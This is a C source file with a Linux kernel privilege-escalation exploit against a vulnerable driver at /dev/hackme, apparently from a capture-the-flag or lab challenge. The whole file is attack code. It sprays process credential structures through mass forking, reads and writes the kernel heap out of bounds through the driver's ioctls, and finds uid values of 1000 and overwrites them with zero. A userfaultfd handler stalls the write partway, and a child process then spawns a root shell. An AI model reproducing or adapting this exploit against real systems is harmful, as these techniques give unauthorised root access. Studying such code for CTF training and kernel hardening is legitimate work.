#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <stdint.h>
#include <poll.h>
#include <errno.h>
#include <assert.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>      /* Definition of SYS_* constants */
#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/mman.h>

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                       } while (0)

#define KMALLOC 0x30000
#define KFREE 0x30001
#define WRITE 0x30002
#define READ 0x30003

typedef struct object
{
	unsigned int idx;
	long user_buffer;
	long length;
	long offset;
}object;


// glabol val
int fd = 0;
object* obj = NULL;

int open_hackme()
{
	fd = open("/dev/hackme", 0);
	if(fd < 0)
	{
		puts("[!] Failed to open device!");
		exit(-1);
	}
	puts("[*] Opened device.");
	return fd;
}


void alloc_object(int idx, unsigned char* user, long length)
{	
	obj->idx = idx;
	obj->length = length;
	obj->user_buffer = user;
	ioctl(fd, KMALLOC, obj);
}

void free_object(int idx)
{
	obj->idx = idx;
	ioctl(fd, KFREE, obj);
}

void write_object(int idx, unsigned char* user, long length, long offset)
{
	obj->idx = idx;
	obj->user_buffer = user;
	obj->length = length;
	obj->offset = offset;

	ioctl(fd, WRITE, obj);
}

void read_object(int idx, unsigned char* user, long length, long offset)
{
	obj->idx = idx;
	obj->user_buffer = user;
	obj->length = length;
	obj->offset = offset;

	ioctl(fd, READ, obj);
}


void spawn_root(int i)
{
	while(1)
	{	
		// sleep for schedule
		sleep(1);	
		// if cred's uid if modified
		if(getuid() == 0)
		{
			printf("[*] Spawn root at process %d \n", i);
			execl("/bin/sh", "sh", NULL);
			exit(-1);
		}
	}
	return ;
}

static void* handler(void* arg)
{
	static struct uffd_msg msg;  
	unsigned long uffd = (unsigned long) arg;
	puts("[*] Handler started !");

	// in loop to wait pagefault
	for(;;)
	{
		// See what poll() tells us about the userfaultfd. 
		struct pollfd pollfd;
		int nready, nread;
		pollfd.fd = uffd;
		pollfd.events = POLLIN;
		nready = poll(&pollfd, 1, -1);

		if (nready == -1)
		       errExit("poll");


		nread = read(uffd, &msg, sizeof(msg));
		if (nread == 0) {
			printf("EOF on userfaultfd!\n");
			exit(EXIT_FAILURE);
		}

		if (msg.event == UFFD_EVENT_PAGEFAULT) {
			puts("[*] Get A PageFault.");
			sleep(1000);
		}

		puts("[!] No fault...");
	}

	return 0;
}


void register_userfault(unsigned long fault_page, unsigned long fault_page_length)
{

	struct uffdio_api uapi;
	struct uffdio_register ur;
	pthread_t thr;

	// 1. create a userfaultfd
	unsigned long uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	uapi.api = UFFD_API;
	uapi.features = 0;

	if (ioctl(uffd, UFFDIO_API, &uapi) == -1)
	    errExit("ioctl-UFFDIO_API");

	// 2. register memory area
	ur.range.start = fault_page;
	ur.range.len = fault_page_length;
	ur.mode = UFFDIO_REGISTER_MODE_MISSING;
	if(ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
		errExit("ioctl-UFFDIO_REGISTER");

	// 3. register userfault handler thread
	int err = pthread_create(&thr, NULL, handler, (void*)uffd);
	if(err != 0 )
		errExit("pthread_create");

	return ;
}




#define MAX_HEAP_AREA 0x160000
#define SEARCH_SIZE  0x10000

int main()
{
	// init a object and user_buffer to communicate with kernel
	obj = malloc(sizeof(object));
	open_hackme();

	unsigned int i, j;
	int cred_offset = -1;
	// cred heap spray
	for(i = 0; i < 0x200; i++)
	{
		if(fork() == 0)
		{
			spawn_root(i);
		}
	}
	puts("[*] Creds heap Spray done!");

	unsigned char* mem = NULL;
	mem = malloc(MAX_HEAP_AREA);
	memset(mem, 0, MAX_HEAP_AREA);


	alloc_object(0, mem, 0x100);
	read_object(0, mem, MAX_HEAP_AREA, -MAX_HEAP_AREA);
	unsigned int* unit = (unsigned int*)mem;

	puts("[*] Start to search for creds.");
	for(i = 0; i < SEARCH_SIZE/4; i++)
	{
		if(unit[i] == 1000 & unit[i+1] == 1000 & unit[i+2] == 1000 & unit[i+3] == 1000 & unit[i+4] == 1000 &
			unit[i+5] == 1000 & unit[i+6] == 1000 & unit[i+7] == 1000)
		{

			cred_offset = i * 4;						// offset from read kernel start
			printf("[*] Find cred at offset 0x%lx\n", cred_offset);
			for(j = 0; j < 8; j++)
			{
				// modify uid | euid .. = 0
				unit[i+j] = 0;
			}
			break;
		}
	}

	if (cred_offset == -1)
	{
		puts("[x] Failed to find creds!\n");
		exit(-1);
	}

	// set userfaultfd and overwrite cred
	unsigned long fault_page, fault_page_length;
	char *new_mem = (char *) mmap(NULL, MAX_HEAP_AREA, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	memcpy(new_mem, mem, SEARCH_SIZE);
	fault_page = (uint64_t)new_mem + SEARCH_SIZE;
	fault_page_length = MAX_HEAP_AREA - SEARCH_SIZE;
	register_userfault(fault_page, fault_page_length);

	write_object(0, new_mem, MAX_HEAP_AREA, -MAX_HEAP_AREA);

	spawn_root(0);

	return 0;
}